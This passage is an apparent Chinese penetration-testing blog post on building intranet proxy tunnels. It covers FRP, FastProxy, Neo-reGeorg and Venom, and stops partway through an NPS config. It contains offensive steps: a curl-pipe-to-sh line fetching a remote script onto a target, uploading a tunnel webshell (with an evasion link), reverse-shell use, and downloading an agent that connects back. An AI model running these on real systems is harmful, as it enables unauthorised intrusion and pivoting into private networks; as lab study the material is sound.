@@ -1,0 +1,1629 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta name="keywords" content="内网代理, 清风的博客">
+    <meta name="description" content="内网代理在了解内网代理之前我们需要知道，有的工具是用来创建代理隧道的，搭配配置代理的工具达到内网穿透的目的。简单点理解就是，创建代理工具是开凿一个水渠，而配置代理工具就是把水流引到想要的地方。
+创建代理工具：
+FRP、Neo-reGeorg">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>内网代理 | 清风的博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">清风的博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/CTF" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-friends" style="zoom: 0.6;"></i>
+      
+      <span>友人铺</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">清风的博客</div>
+        <div class="logo-desc">
+            
+            勤奋总有回报
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/CTF" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-friends"></i>
+			
+			友人铺
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">内网代理</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                渗透
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-06-06
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-09-14
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    12 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>在了解内网代理之前我们需要知道，有的工具是用来创建代理隧道的，搭配配置代理的工具达到内网穿透的目的。简单点理解就是，创建代理工具是开凿一个水渠，而配置代理工具就是把水流引到想要的地方。</p>
+<p>创建代理工具：</p>
+<pre class=" language-xml"><code class="language-xml">FRP、Neo-reGeorg、Venom、NPS
+</code></pre>
+<p>配置代理工具：</p>
+<pre class=" language-xml"><code class="language-xml">SwitchyOmega（浏览器插件，适用于Linux和Windows）
+proxifier （配置系统代理或者应用代理，仅使用Windows）
+Proxychains（Kali的代理神器）
+</code></pre>
+<h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
+<p>0.47的有Windows的：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423083504-2lof3by.png" alt="image">​</p>
+<p>一般下载amd64就可以了</p>
+<p>目录结构：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423083741-2t3lfok.png" alt="image"></p>
+<p>各个文件的释义：</p>
+<pre class=" language-xml"><code class="language-xml">frpc.exe（客户端）	frpc.ini(客户端配置文件)
+frps.exe（服务端）	frps.ini(服务端配置文件)
+</code></pre>
+<h3 id="1-手搓"><a href="#1-手搓" class="headerlink" title="1.手搓"></a>1.手搓</h3><p>服务端：如果要打远程内网，服务端都是放在<code>VPS</code>​上的，<strong>保证服务端和客户端都能同时访问到这台VPS即可搭建代理隧道</strong></p>
+<p>使用frp之前要配置好<code>frps.ini</code>​和<code>frpc.in</code>​</p>
+<p>frpc.ini:</p>
+<pre class=" language-xml"><code class="language-xml">[common]
+server_addr = 10.103.119.169
+server_port = 7000
+token = frpToken@admin2022
+
+
+[proxy]
+type = tcp
+plugin = socks5
+remote_port = 25599
+</code></pre>
+<p>frps.ini:</p>
+<pre class=" language-xml"><code class="language-xml">[common]
+## 一、服务器的基本配置部分
+## 7000 是FRP服务端口，可以改
+bind_port = 7000
+## dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。
+dashboard_user = admin
+dashboard_pwd = frpadmin@2022
+## 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆
+dashboard_port = 25500
+## 服务器和客户机之间的心跳连接
+heartbeat_timeout = 30
+#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求
+token=frpToken@admin2022
+</code></pre>
+<p>服务端：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605210251-0fimss9.png" alt="image">​</p>
+<p>客户端：</p>
+<p>客户端先反弹一个shell，否则蚁剑的webshell不支持一直运行一个程序</p>
+<p>反弹shell之后要记得chmod 777 frpc</p>
+<p>给程序赋权之后就可以运行了</p>
+<p>​​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605210319-2zgrxcw.png" alt="image">​​</p>
+<p>手搓的话代理就是开在 <code>vpsIP:25599</code>​了</p>
+<p>访问<code>http://serverip:25500/</code>​ 可以看到配置情况：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605211740-38bd9ac.png" alt="image">​</p>
+<p>这样子就算搭建好一个socks5隧道。当然了，上面只是最简单的例子，并没有设置密码等功能。</p>
+<h3 id="​SwitchyOmega​​配置代理"><a href="#​SwitchyOmega​​配置代理" class="headerlink" title="​SwitchyOmega​​配置代理"></a>​<code>SwitchyOmega</code>​​配置代理</h3><p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605210802-fib2enz.png" alt="image">​</p>
+<p>​​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605210627-myxj9nq.png" alt="image">​​</p>
+<h3 id="2-工具"><a href="#2-工具" class="headerlink" title="2.工具"></a>2.工具</h3><p>工具很简单，也是在frp基础上为了更好地利用frp开发的</p>
+<p>地址：<code>https://github.com/LxxxSec/FastProxy</code>​</p>
+<p>这种方法只适用于<code>linux</code>​客户端</p>
+<p>利用方式很简单，在vps上面运行（服务端）：</p>
+<pre class=" language-bash"><code class="language-bash">python3 app.py vpsip 12345
+</code></pre>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423100855-8gywimb.png" alt="image">​</p>
+<p>‍</p>
+<p>然后在客户端（靶机）运行：</p>
+<pre class=" language-bash"><code class="language-bash">curl http://123.249.8.26:12345/hack -s <span class="token operator">|</span> sh <span class="token operator">&amp;</span>
+</code></pre>
+<p>就是python开启的服务端中第一个[+]里面提示的东西</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423101000-4exoztz.png" alt="image">​</p>
+<p>这样子就算搭建好了内网代理</p>
+<p>这里搭建的代理有秘密，账号密码是 <code>admin/password</code>​</p>
+<h3 id="kali配置代理："><a href="#kali配置代理：" class="headerlink" title="kali配置代理："></a>kali配置代理：</h3><pre class=" language-bash"><code class="language-bash">gedit /etc/proxychains4.conf
+</code></pre>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423092810-yg12a53.png" alt="image">​</p>
+<p>验证成功性：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423092946-phli4gf.png" alt="image">​</p>
+<h3 id="proxifier配置代理："><a href="#proxifier配置代理：" class="headerlink" title="proxifier配置代理："></a>proxifier配置代理：</h3><p>这里可以看到代理的IP和端口，账号和密码</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423092859-h94udxf.png" alt="image">​</p>
+<p>‍</p>
+<p>根据搭建好的socks5代理，进行规则配置：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605212304-lrmtgbv.png" alt="image">​</p>
+<p>‍</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605213202-j0dyb2n.png" alt="image">​</p>
+<p><strong>注意：配置全局代理有一些本地的应用将会失去网络连接，即断网</strong></p>
+<p>配置代理服务器，配置完之后可以点击检查，看右边的如果测试通过则表示代理配置成功：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423092837-rykd9l5.png" alt="image">​</p>
+<p>之后就是全局代理了，可以直接访问内网：</p>
+<p>​​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230423101341-yzlf48t.png" alt="image">​​</p>
+<p>当然了，这里也可以配置单个的应用代理，只需要在代理规则那里将想要代理的应用使用代理，任意应用采取direct策略即可</p>
+<p>假设这里要设置远程桌面应用：</p>
+<p>​​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605213532-a5szlza.png" alt="image">​​</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605213628-11908db.png" alt="image">​</p>
+<p>测试访问情况：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/0e76e707cca885d1066f04b8306e6d0a-20230605213647-fism7l8.png" alt="0e76e707cca885d1066f04b8306e6d0a">​</p>
+<p>发现可以成功登陆</p>
+<p>‍</p>
+<h4 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h4><p>这里就算设置了proxifier的代理应用为全部好像还是利用不了fscan扫描，有点奇怪。可以单独给fscan设置一个应用代理。</p>
+<h2 id="Neo-reGeorg代理"><a href="#Neo-reGeorg代理" class="headerlink" title="Neo-reGeorg代理"></a>Neo-reGeorg代理</h2><p>先生成我们需要的shell：</p>
+<p>​<code>python neoreg.py generate -k qingfeng</code>​</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230605214656-070k94a.png" alt="image">​</p>
+<p>根据目标的web服务选择上传的shell文件</p>
+<p>把neoreg_servers目录下面生成的php文件放到目标文件上。切记这里不要把templates目录下的php当成生成的恶意文件，那个只是模板，可以自己修改，想要修改可以参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/16609082.html%E8%BF%87%E5%85%8D%E6%9D%80%EF%BC%8C%60%E5%85%B6%E4%B8%AD%E6%9C%89%E4%B8%80%E4%B8%AA%E6%8A%8A%E5%9B%9E%E6%98%BE%E6%94%B9%E6%88%90404%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9E%E6%8E%A5%E4%BD%BF%E7%94%A8--skip%E7%9A%84%E6%80%9D%E8%B7%AF%E8%BF%98%E6%8C%BA%E6%96%B0%E5%A5%87%E7%9A%84%EF%BC%8C%E5%80%BC%E5%BE%97%E5%8F%82%E8%80%83%60%E2%80%8B%E3%80%82%E8%BF%87%E8%BF%99%E4%B8%AA%E5%9D%91%E6%84%9F%E8%B0%A2qiu%E7%88%B7%E5%A5%BD%E9%AA%82%E3%80%82">https://www.cnblogs.com/zpchcbd/p/16609082.html过免杀，`其中有一个把回显改成404，然后连接使用--skip的思路还挺新奇的，值得参考`​。过这个坑感谢qiu爷好骂。</a></p>
+<p>使用本机连接：</p>
+<pre class=" language-bash"><code class="language-bash">python neoreg.py -u http://192.168.64.129/tunnel.php -k qingfeng -p 9999
+</code></pre>
+<p>这里使用<code>SwitchyOmega</code>​演示:</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230606185905-fvd7d25.png" alt="image">​</p>
+<p>访问试试看：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230606190022-itlt6et.png" alt="image">​</p>
+<p>有一个参数可以注意的就是，如果我们不指定<code>-l</code>​参数，他默认就是<code>127.0.0.1</code>​。这种情况下这个代理只能本机使用了，如果是使用命令：</p>
+<pre class=" language-bash"><code class="language-bash">python neoreg.py -u http://192.168.64.129/tunnel.php -k qingfeng -p 9999 -l 192.168.64.1
+</code></pre>
+<p>这样子指定一个别人能访问得到的ip，那么这个代理就可以供其他机器使用了</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230606190827-roj151a.png" alt="image">​</p>
+<p>我们再kali上连接代理尝试访问：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230606190931-36292wu.png" alt="image">​</p>
+<p>发现是可以成功的</p>
+<p>‍</p>
+<h2 id="Venom代理"><a href="#Venom代理" class="headerlink" title="Venom代理"></a><strong>Venom代理</strong></h2><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools<span class="token punctuation">]</span>
+└─<span class="token variable">$git</span> clone https://github.com/Dliv3/Venom
+</code></pre>
+<p>安装好后进入目录编译一下：</p>
+<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/Venom<span class="token punctuation">]</span>
+└─$ ./build.sh   
+build macos x64 admin <span class="token operator">&amp;</span> agent<span class="token punctuation">..</span>.
+go: downloading github.com/cheggaaa/pb/v3 v3.0.1
+go: downloading golang.org/x/crypto v0.0.0-20190911031432-227b76d455e7
+go: downloading github.com/libp2p/go-reuseport v0.0.1
+go: downloading github.com/fatih/color v1.7.0
+go: downloading github.com/VividCortex/ewma v1.1.1
+go: downloading github.com/mattn/go-colorable v0.1.2
+go: downloading github.com/mattn/go-isatty v0.0.8
+go: downloading github.com/mattn/go-runewidth v0.0.4
+go: downloading golang.org/x/sys v0.0.0-20190412213103-97732733099d
+build linux x64 admin <span class="token operator">&amp;</span> agent<span class="token punctuation">..</span>.
+build linux x86 admin <span class="token operator">&amp;</span> agent<span class="token punctuation">..</span>.
+build windows x86 admin <span class="token operator">&amp;</span> agent<span class="token punctuation">..</span>.
+build arm eabi5 agent<span class="token punctuation">..</span>.
+build mipsel agent<span class="token punctuation">..</span>
+</code></pre>
+<p>进入<code>release</code>​目录，本地开启一个<code>http</code>​服务供<code>docker</code>​下载客户端用于连接我们：</p>
+<p>我们先看一下客户端docker的环境是多少位的内核版本多少：</p>
+<pre class=" language-bash"><code class="language-bash">/app <span class="token comment" spellcheck="true"># cat /proc/version           </span>
+Linux version 3.13.0-24-generic <span class="token punctuation">(</span>buildd@panlong<span class="token punctuation">)</span> <span class="token punctuation">(</span>gcc version 4.8.2 <span class="token punctuation">(</span>Ubuntu 4.8.2-19ubuntu1<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014</span>
+/app <span class="token comment" spellcheck="true"># uname -a</span>
+Linux 755411217bdd 3.13.0-24-generic <span class="token comment" spellcheck="true">#46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 Linux</span>
+</code></pre>
+<p>可以看到是64位的</p>
+<p>‍</p>
+<p>我们在<code>/Venom/release</code>​目录下面用<code>python</code>​开一个<code>web</code>​服务:</p>
+<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/Venom/release<span class="token punctuation">]</span>
+└─$ python -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 <span class="token punctuation">(</span>http://0.0.0.0:8888/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.
+</code></pre>
+<p>然后在目标靶机上下载客户端：</p>
+<pre class=" language-bash"><code class="language-bash">/app <span class="token comment" spellcheck="true"># wget 192.168.64.128:8888/agent_linux_x64</span>
+Connecting to 192.168.64.128:8888 <span class="token punctuation">(</span>192.168.64.128:8888<span class="token punctuation">)</span>
+agent_linux_x64      100% <span class="token operator">|</span>*******************************<span class="token operator">|</span>  3564k  0:00:00 ETA
+</code></pre>
+<p>‍</p>
+<p>kali开启监听端口：</p>
+<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/Venom/release<span class="token punctuation">]</span>
+└─$ ./admin_linux_x64 -lport 2333 
+Venom Admin Node Start<span class="token punctuation">..</span>.
+
+                                                                       
+     ██▒   █▓█████ ███▄    █ ▒█████  ███▄ ▄███▓                        
+    ▓██░   █▓█   ▀ ██ ▀█   █▒██▒  ██▓██▒▀█▀ ██▒                        
+     ▓██  █▒▒███  ▓██  ▀█ ██▒██░  ██▓██    ▓██░                        
+      ▒██ █░▒▓█  ▄▓██▒  ▐▌██▒██   ██▒██    ▒██                         
+       ▒▀█░ ░▒████▒██░   ▓██░ ████▓▒▒██▒   ░██▒                        
+       ░ ▐░ ░░ ▒░ ░ ▒░   ▒ ▒░ ▒░▒░▒░░ ▒░   ░  ░                        
+       ░ ░░  ░ ░  ░ ░░   ░ ▒░ ░ ▒ ▒░░  ░      ░                        
+         ░░    ░     ░   ░ ░░ ░ ░ ▒ ░      ░                           
+          ░    ░  ░        ░    ░ ░        ░                           
+         ░                                                             
+               <span class="token punctuation">{</span> v1.1 author: Dlive <span class="token punctuation">}</span> 
+</code></pre>
+<p>目标机连接kali：</p>
+<pre class=" language-bash"><code class="language-bash">/app <span class="token comment" spellcheck="true"># ./agent_linux_x64 -rhost 192.168.64.128 -rport 2333</span>
+./agent_linux_x64 -rhost 192.168.64.128 -rport 2333
+2023/06/01 06:45:18 <span class="token punctuation">[</span>+<span class="token punctuation">]</span>Successfully connects to a new node
+</code></pre>
+<p>连接成功后可以用show查看连接的情况：</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230601192857-7d55eso.png" alt="image">​</p>
+<p>我们可以利用<code>goto 1</code>​进入该节点</p>
+<p>可以利用该节点搭建<code>socket5</code>​代理</p>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230601193058-hd3jrd8.png" alt="image">​</p>
+<p>接着利用本机的<code>kali</code>​的<code>proxychains</code>​来连接这个<code>socket</code>​代理</p>
+<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>
+└─$ <span class="token function">sudo</span> gedit /etc/proxychains4.conf
+</code></pre>
+<p>​<img src="/Blogimages/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/image-20230601193233-jy5kae1.png" alt="image">​</p>
+<p>配置好代理就可以开始内网信息收集了</p>
+<p>‍</p>
+<h2 id="NPS代理"><a href="#NPS代理" class="headerlink" title="NPS代理"></a>NPS代理</h2><p>‍</p>
+<p>nps_server.conf的配置文件：</p>
+<pre class=" language-xml"><code class="language-xml">appname = nps
+#Boot mode(dev|pro)
+#启动模式
+runmode = dev
+
+#HTTP(S) proxy port, no startup if empty
+#HTTP(S)代理端口，如果为空则不启动
+http_proxy_ip=0.0.0.0
+http_proxy_port=8081   #http监听端口，默认80
+https_proxy_port=443
+https_just_proxy=true
+#default https certificate setting
+#默认HTTPS证书设置
+https_default_cert_file=conf/server.pem
+https_default_key_file=conf/server.key
+
+##bridge
+##桥接
+bridge_type=tcp
+bridge_port=8024		##客户端与服务端连接端口
+bridge_ip=0.0.0.0
+
+## Public password, which clients can use to connect to the server
+## 公共密码，客户端可以使用它连接到服务器
+## After the connection, the server will be able to open relevant ports and parse related domain names according to its own configuration file.
+## 连接完成后，服务器就可以打开相关端口，根据自己的配置文件解析相关域名。
+public_vkey=123
+
+#Traffic data persistence interval(minute)
+#流量数据持续时间间隔(分钟)
+#Ignorance means no persistence
+#flow_store_interval=1
+
+## log level LevelEmergency->0  LevelAlert->1 LevelCritical->2 LevelError->3 LevelWarning->4 LevelNotice->5 LevelInformational->6 LevelDebug->7
+## 日志等级设置
+log_level=7
+#log_path=nps.log
+
+#Whether to restrict IP access, true or false or ignore
+#是否限制IP访问，true、false或ignore
+#ip_limit=true
+
+#p2p代理
+#p2p_ip=127.0.0.1
+#p2p_port=6000
+
+#web
+web_host=						##web管理端登录地址URL
+web_username=admin	##web管理端登录名
+web_password=123		##web管理端登录密码（注：正式环境建议更改）
+web_port = 8080			##web管理端访问端口
+web_ip=0.0.0.0			##web管理端登录地址默认0.0.0.0不需要修改
+web_base_url=				##管理端web路径，默认不需要指定
+web_open_ssl=false	#管理端是否开启ssl
+web_cert_file=conf/server.pem
+web_key_file=conf/server.key
+## if web under proxy use sub path. like http://host/nps need this.
+#web_base_url=/nps
+
+#Web API unauthenticated IP address(the len of auth_crypt_key must be 16)
+#Remove comments if needed
+#auth_key=test
+auth_crypt_key =1234567812345678
+
+#allow_ports=9001-9009,10001,11000-12000
+
+#Web management multi-user login
+#Web管理多用户登录
+allow_user_login=false
+allow_user_register=false
+allow_user_change_username=false
+
+
+#extension
+allow_flow_limit=false
+allow_rate_limit=false
